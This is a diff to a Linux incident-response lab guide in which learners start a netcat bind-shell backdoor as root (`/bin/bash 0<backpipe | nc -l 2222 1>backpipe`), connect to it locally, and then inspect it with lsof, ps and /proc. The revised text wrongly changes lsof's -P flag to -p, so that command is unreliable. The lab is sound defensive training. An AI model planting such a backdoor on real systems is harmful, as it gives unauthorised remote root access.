@@ -5,154 +5,163 @@ In this lab we will be looking at a backdoor through the lens of the the Linux C
 
 We will be using a large number of different basic commands to get a better understanding of what the backdoor is and what it does.
 
-For this lab we will be running three different Ubuntu terminals.
+For this lab we will be running **three** different Ubuntu terminals.
 
-The first will be where we run the backdoor.
+ > Terminal 1 is where the backdoor will be run.
 
-The second will be where we connect to it.
+ > Terminal 2 is where we will connect to the back door.
 
-The third is where we will be running our analysis.
+ > Terminal 3 is where we will be running our analysis.
 
-Let’s get started by opening a Terminal as Administrator
+***
+
+Let’s get started by opening a Terminal as Administrator, there are a few methods to do this.  
+
+Method 1 is to right click on the desktop and select open. 
 
 ![](attachments/OpeningKaliInstance.png)
 
-Alternatively, you can click on the Kali logo in the taskbar.
+Method 2 is to simply click on the Kali logo in the taskbar.
 
 ![](attachments/TaskbarKaliIcon.png)
 
 When you get the User Account Control Prompt, select Yes.
 
-And, open a Ubuntu command prompt:
+And, open a **Ubuntu** command prompt:
 
+==####NOTE#####== 
 
-####NOTE##### 
+If you are havin trouble launching any of Windows many terminals.  All you have to do is click on the Windows Start button and type.  
 
-If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 
+`Powershell`, `Ubuntu`, or `Command Prompt` 
 
- 
+If you use **PowerShell** or **Command Prompt**, you will have to right click on them and select Run As Administrator 
 
-Simply click the Windows Start button in the lower left of your screen and type: 
+==###END NOTE###==
 
- 
+***
 
-`Powershell` 
+On your **Linux** terminal, please run the following command:
 
-or 
-
-`Ubuntu`
-
-or 
-
-`Command Prompt` 
-
- 
-
-For PowerShell and Command Prompt, please right click on them and select Run As Administrator 
-
-###END NOTE###
-
-
-On your Linux terminal, please run the following command:
-
-<pre>sudo su -</pre>
+`sudo su - `
 
 The password is adhd.
 
-
 This will get us to a root prompt. We want to do this because we want to have a backdoor running as root and a connection from a different user account on the system.
 
-We will next need to create a fifo backpipe:
+Next, we will need to create a **FIFO** backpipe:
 
-<pre>mknod backpipe p</pre>
+`mknod backpipe p`
 
 Next, let's start the backdoor:
 
 `/bin/bash  0<backpipe | nc -l 2222 1>backpipe`
 
-In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session.  It then takes the output of the bash session and puts it back into the netcat listener. 
+In the above command, we are creating a **Netcat listener** that forwards all input through a backpipe and then into a bash session.  It then takes the output of the bash session and puts it back into the **Netcat listener**. 
 
-Basically, this will create a backdoor listening on port 2222 of our linux system.
+On a more basic level, this will create a backdoor listening on port 2222 of our **Linux** system.
 
-Now, let's open another Ubuntu terminal.  This will be the terminal we connect to the above created backdoor with.
+Now, let's open another **Ubuntu** terminal.  This terminal will connect to the backdoor we just created.  
+
+Method 1 is to right click on the desktop and select open. 
 
 ![](attachments/OpeningKaliInstance.png)
 
-Alternatively, you can click on the Kali logo in the taskbar.
+Method 2 is to simply click on the Kali logo in the taskbar.
 
 ![](attachments/TaskbarKaliIcon.png)
 
-Now we will need to know the IP address of our linux system:
+Now we will need to know the IP address of our **linux** system:
 
-<pre>ifconfig</pre>
+`ifconfig`
 
 ![](attachments/ifconfigKaliInstance.png)
 
 Now, let's connect:
 
-<pre> nc 127.0.0.1 2222</pre>
+`nc 127.0.0.1 2222`
 
-Remember!!!  Your IP address will be different!!!!
+<p style="color: red; font-size: 24px; background-color: yellow; font-weight: bold;">Remember!!!  Your IP address will be different!!!!</p>
 
-Now, let's type some commands and make sure it is working
+***
 
-<pre>ls</pre>
-<pre>whoami</pre>
+It can be confusing to tell whether or not you are connected to the backdoor.  A few ways to confirm are as follows.  
+
+1. Typing some commands to ensure it is working
+
+`ls`
+
+`whoami`
 
 ![](attachments/lswhoamiKaliInstance.png)
 
-As you can see, we are connected to the simple Linux backdoor as root.  Also notice there was not message saying we successfully connected to the backdoor.  It just drops our cursor back to the left side of the screen.
+2. If your cursor drops down to the bottom left side of your screen.
 
-Now, let's open yet another Ubuntu terminal and start our analysis. This means we have one where we created the backdoor, another that connected to it and this third one will be for the analysis.
+***
+
+At this point, we have created a backdoor with one terminal, and we have connected to this backdoor with another terminal.  Now, let's open yet another **Ubuntu** terminal and use this use for the purpose of analysis.  
+
+Let's begin by using one of the two methods used earlier to open a new **Ubuntu** Terminal.  
+
+Method 1 is to right click on the desktop and select open. 
 
 ![](attachments/OpeningKaliInstance.png)
 
-Alternatively, you can click on the Kali logo in the taskbar.
+Method 2 is to simply click on the Kali logo in the taskbar.
 
 ![](attachments/TaskbarKaliIcon.png)
 
 On your Linux terminal, please run the following command:
 
-<pre>sudo su -</pre>
+`sudo su -`
 
-This will get us to a root prompt.   We want to be root because looking at network connections and process information systemwide requires root access.  Basically, it is very hard to do your job as a SOC pro without root or admin rights.
+This will get us to a root prompt.  When we say root prompt we mean a terminal with the highest level of permission possible.  We want to be in a root prompt because looking at network connections and process information system wide requires root priviledges (or the highest level of priviledges).  
 
-Let's start by looking at the network connections with lsof.  When we use lsof, we are looking at open files.  When we use the -i flag we are looking at the open Internet connections.  When we use the -P flag we are telling lsof to not try and guess what the service is on the ports that are being used. Just give us the port number.
+Let's start by looking at the network connections with **lsof**.  When we use **lsof**, we are looking at open files.  When we use the **-i** flag we are looking at the open Internet connections.  When we use the **-p** flag we are telling **lsof** to not try and guess what the service is on the ports that are being used. Just give us the port number.
 
-<pre>lsof -i -P</pre>
+`lsof -i -p`
 
 
 ![](attachments/lsof-i-pKaliInstance.png)
 
-Now let's dig into the netcat process ID.  We can do this with the lowercase p switch.  This will give us all the open files associated with the listed process ID.
+Now let's dig into the **netcat process ID**.  We can do this with the lowercase **-p** switch.  This will give us all the open files associated with the listed process ID.
 
-<pre>lsof -p 131</pre>
+`lsof -p 131`
 
 ![](attachments/lsof-pKaliInstance.png)
 
-Let's look at the full processes.  We can do this with the ps command. We are also adding the aux switches.  This is a for all processes,  u for sorted by user and x to include the processes using a teletype terminal.
+Let's look at the full processes.  We can do this with the **ps** command. We are also adding the **aux switches**.  
 
-<pre>ps aux</pre>
+aux
+* a is for all processes
+* u is for sorted users
+* x is for all processes using a teletype terminal
+
+Type out this command.
+
+`ps aux`
 
 ![](attachments/psauxKaliInstance.png)
 
-Let's change directories into the proc directory for that pid.  Remember, proc is a directory that does not exist on the drive.  It allows us to see data associated with the various processes directly.   This can be very useful as it allows us to dig into the memory of a process that is currently running on a suspect system.
+Let's change directories into the **proc** directory for that **pid**.  Remember, **proc** is a directory that does not exist on the drive.  It allows us to see data associated with the various processes directly.   This can be very useful as it allows us to dig into the memory of a process that is currently running on a suspect system.
 
-<pre>cd /proc/[pid]</pre>
+`cd /proc/[pid]`
 
 ![](attachments/procPIDKaliInstance.png)
 
 We can see a number of interesting directories here:
 
-<pre>ls</pre>
+`ls`
 
 ![](attachments/lsKaliInstance.png)
 
-Remember!!!  Your PID will be different!!!
+<p style="color: red; font-size: 24px; background-color: yellow; font-weight: bold;">Remember!!!  Your PID will be different!!!</p>
 
-We can run strings on the exe in this directory.  This is very, very useful as when programs are created there may be usage information, mentions of system libraries and possible code comments.  We use this all the time to attempt to identify what exactly a program is doing.
+***
 
-<pre>strings ./exe | less</pre>
+We can run strings on the exe in this directory.  When programs are created there may be usage information, mentions of system libraries, and possible code comments.  We use this all the time to attempt to identify what exactly a program is doing.
+
+`strings ./exe | less`
 
 ![](attachments/strings_exelessKaliInstance.png)
 
@@ -160,6 +169,7 @@ If we scroll down, we can see the actual usage information for netcat.  We pulle
 
 ![](attachments/netcatusageKaliInstance.png)
 
+***
 
 
 
